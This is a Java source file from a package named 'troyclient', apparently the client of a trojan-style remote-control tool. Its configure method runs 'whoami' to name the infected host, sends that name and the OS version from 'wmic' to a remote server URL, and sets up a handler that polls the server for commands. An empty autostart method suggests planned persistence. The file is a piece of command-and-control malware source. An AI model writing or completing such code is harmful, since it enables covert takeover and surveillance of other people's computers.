package ch.lebois.troyclient.service;

/**
 * @author Felix
 * @date 21.02.2018
 * <p>
 * Project: Hermann
 * Package: ch.lebois.troyclient.service
 **/
public class ConfigureInit {


    private WebHandler webHandler;

    public WebHandler getWebHandler() {
        return webHandler;
    }

    public void configure(String url) {
        GetContext.CLIENT_NAME = Console.execute("whoami")
                .get(1)
                .replace("\\", "-");
        GetContext.SENDER = new Sender(url);

        webHandler = new WebHandler(url + "/command/" + GetContext.CLIENT_NAME);
        operatingSystem();
        autostart();
    }

    private void autostart() {
    }

    public void operatingSystem() {
        try {
            GetContext.SENDER.send("os", Console.execute("wmic os get caption").get(3));
        } catch (Exception e) {
            GetContext.SENDER.send("os", "linux");
        }
    }
}
